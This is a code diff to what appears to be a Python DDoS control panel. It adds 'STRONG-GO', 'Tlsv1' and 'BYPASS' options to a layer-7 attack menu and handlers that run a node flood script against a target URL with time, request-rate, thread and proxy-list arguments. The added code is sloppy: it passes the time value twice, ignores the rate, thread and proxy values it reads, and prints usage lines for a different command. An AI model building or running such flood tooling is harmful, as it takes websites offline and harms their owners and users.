@@ -151,9 +151,9 @@ def layer7():
  ║A║  HTTP-API ║  HTTP-PRO ║   ovh     ║  HTTP-GET ║R║
  ║P║           ║   TLS     ║           ║  HTTP-POST║A║
  ║I║           ║  xeriatls ║           ║  HTTP-RAW ║W║
- ╚═╣           ║           ║           ║           ╠═╝
-   ║           ║           ║           ║           ║
-   ║           ║           ║           ║           ║
+ ╚═╣           ║ STRONG-GO ║           ║           ╠═╝
+   ║           ║   Tlsv1   ║           ║           ║
+   ║           ║   BYPASS  ║           ║           ║
    ║           ║           ║           ║           ║
    ║           ║           ║           ║           ║
    ║           ║           ║           ║           ║
@@ -604,7 +604,35 @@ def main():
                 os.system(f'node http-get {url} {time}')
             except IndexError:
                 print('Usage: http-get <url> <time>')
-                print('Example: htt-pget http://example.com')
+                print('Example: htt-get http://example.com')
+
+        elif "Tlsv1" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                rps = cnc.split()[3]
+                threads = cnc.split()[4]
+                proxy = cnc.split()[5]
+                
+                os.system(f'node Tlsv1 {url} {time} {time}')
+            except IndexError:
+                print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
+                print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
+
+        elif "BYPASS" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                rps = cnc.split()[3]
+                threads = cnc.split()[4]
+                proxy = cnc.split()[5]
+                
+                os.system(f'node Tlsv1 {url} {time} {time}')
+            except IndexError:
+                print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
+                print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
+
+        
 
 # BANNERS
 
